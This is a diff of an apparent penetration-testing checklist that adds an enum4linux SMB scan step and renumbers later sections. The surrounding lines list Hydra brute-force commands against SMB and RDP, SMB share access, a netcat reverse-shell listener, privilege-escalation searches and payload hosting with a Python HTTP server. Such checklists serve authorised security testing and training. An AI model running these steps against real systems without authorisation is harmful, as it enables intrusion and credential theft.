@@ -58,7 +58,11 @@ $hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp
 
-# 5° Gain Access
+# 5° Scan SMB
+
+$enum4linux -a Target_IP | tee enum4linux.log
+
+# 6° Gain Access
 
 http://example.com/login [Exibir código fonte da página]
 
@@ -84,7 +88,7 @@ $sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target
 
 $smbclient //Target_IP/shared/dir
 
-# 6° Reverse Shell
+# 7° Reverse Shell
 
 Execute no terminal shell do Kali Linux $nc -lvnp 6666
 
@@ -96,7 +100,7 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 https://www.sans.org/posters/netcat-cheat-sheet
 
-# 7° Search Priv-Esc
+# 8° Search Priv-Esc
 
 $cat /etc/proc/version
 
@@ -134,7 +138,7 @@ https://gtfobins.github.io
 
 https://www.exploit-db.com
 
-# 8° Deploy Payload
+# 9° Deploy Payload
 
 $python2 -m SimpleHTTPServer 8000
 
